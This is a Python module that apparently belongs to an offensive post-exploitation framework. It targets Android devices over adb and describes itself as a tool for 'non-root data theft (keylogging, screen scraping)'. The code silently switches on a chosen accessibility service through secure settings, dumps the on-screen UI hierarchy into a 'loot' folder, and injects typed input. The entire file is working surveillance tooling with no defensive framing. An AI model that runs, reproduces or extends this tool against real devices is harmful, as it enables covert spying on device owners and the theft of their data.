import subprocess
import os
from rich.console import Console
from utils.logger import log_action

console = Console()

def _adb(device_id, *args):
    cmd = ['adb']
    if device_id:
        cmd += ['-s', device_id]
    cmd += list(args)
    return subprocess.run(cmd, capture_output=True, text=True)

class Module:
    MODULE_INFO = {
        'name': 'post/android_accessibility',
        'description': 'Interact with Accessibility Services for non-root data theft (keylogging, screen scraping).',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'SERVICE': 'The accessibility service to enable (e.g. com.example.app/.MyService)',
            'ACTION': 'Action: enable, disable, dump_ui, type_text [default: enable]',
            'TEXT': 'Text to type (if Action is type_text)',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        service = self.framework.options.get('SERVICE')
        action = self.framework.options.get('ACTION', 'enable').lower()
        text = self.framework.options.get('TEXT', '')

        # Select device
        r = _adb(None, 'devices')
        devices = [l.split('\t')[0] for l in r.stdout.strip().splitlines()[1:] if 'device' in l]
        if not devices:
            console.print("[red][!] No devices found.[/red]")
            return
        dev = device_id if device_id in devices else devices[0]

        if action == 'enable':
            if not service:
                console.print("[red][!] SERVICE option is required to enable.[/red]")
                return
            console.print(f"[*] Enabling accessibility service: [cyan]{service}[/cyan]...")
            # On Android 13+, enabling via ADB might be blocked if it's a "restricted setting"
            # but we attempt it here.
            _adb(dev, 'shell', 'settings', 'put', 'secure', 'enabled_accessibility_services', service)
            _adb(dev, 'shell', 'settings', 'put', 'secure', 'accessibility_enabled', '1')
            console.print("[green][+] Service enabled (if permissions allowed).[/green]")
            log_action(f"Enabled accessibility service {service} on {dev}")

        elif action == 'dump_ui':
            console.print("[*] Dumping UI hierarchy (screen scraping)...")
            r = _adb(dev, 'shell', 'uiautomator', 'dump', '/data/local/tmp/ui.xml')
            if 'UI hierchary dumped to' in r.stdout:
                _adb(dev, 'pull', '/data/local/tmp/ui.xml', 'loot/ui_dump.xml')
                console.print("[green][+] UI dump saved to loot/ui_dump.xml[/green]")
                log_action(f"UI dump collected from {dev}")
            else:
                console.print(f"[red][!] Dump failed: {r.stderr}[/red]")

        elif action == 'type_text':
            if not text:
                console.print("[red][!] TEXT option is required.[/red]")
                return
            console.print(f"[*] Typing text: {text}")
            _adb(dev, 'shell', 'input', 'text', text.replace(' ', '%s'))
            log_action(f"Typed text on {dev}")

        else:
            console.print(f"[red][!] Unknown action: {action}[/red]")
